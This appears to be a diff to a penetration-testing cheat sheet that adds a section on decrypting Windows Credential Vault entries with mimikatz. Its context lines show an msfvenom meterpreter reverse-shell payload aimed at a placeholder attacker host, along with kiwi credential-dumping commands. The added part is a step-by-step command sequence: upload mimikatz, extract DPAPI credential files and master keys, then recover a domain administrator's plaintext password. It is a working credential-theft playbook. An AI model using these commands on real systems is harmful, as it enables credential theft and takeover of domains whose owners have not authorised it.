@@ -207,3 +207,27 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT
 - `load kiwi` will load mimikatz within meterpreter
 - `creds_all`
 - `lsa_dump_sam` will dump hashes from the sam file
+
+## Cracking Credential Vault with mimikatz
+
+- We should have a session (does not have to be admin, needs to be a domain user)
+- We need to upload mimikatz on the target `upload /opt/Tools/mimikatz_trunk/x64/mimikatz.exe C:\\Users\\Public\\mimikatz.exe`
+- `shell`
+- `cd C:\Users\Public`
+- `dir /a C:\users\user\appdata\local\microsoft\credentials`
+- This will list the password files, we will use the smallest on which generally the one we need. 
+- We launch mimikatz: `mimikatz.exe` 
+- `vault::cred` will let us make sure that there are creds in the vault
+- `dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\<CREDENTIAL-FILE-PREVIOUSLY-SELECTED>`
+- We need to keep aside the guidMasterKey 
+- `exit` to exit mimikatz
+- `dir /a C:\users\user\appdata\roaming\microsoft\protect` and now we can keep note of the sid value that shoudl look like this: `03/07/2022  10:31 AM    <DIR>          S-1-5-21-3390063331-4123551052-1719781121-1113`
+- `dir /a C:\users\user\appdata\roaming\microsoft\protect\S-1-5-21-3390063331-4123551052-1719781121-1113` the file with the guid should be the same guid of the guidMasterKey
+- `dpapi::masterkey /in:C:\users\user\appdata\roaming\microsoft\protect\S-1-5-21-3390063331-4123551052-1719781121-1113\09770ae7-8e52-48cd-8899-45bb271132e7 /rpc` 
+- this will output our masterkey value and should look like this: `key : 60f202bff3c6e2eaedfc4c28ac1adbdd102ec7dba401157f6f8c2056205507ed4e6d93120ebe48959751c0f2c939e515382d7ffec7bd2b129c8eb89466b31f0f`
+- `cred /in:C:\users\user\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5 /masterkey:60f202bff3c6e2eaedfc4c28ac1adbdd102ec7dba401157f6f8c2056205507ed4e6d93120ebe48959751c0f2c939e515382d7ffec7bd2b129c8eb89466b31f0f`
+- We will get the dc password in plaintext it should look like this:
+  ```
+  UserName       : domain\Administrator
+  CredentialBlob : Password123!
+  ```
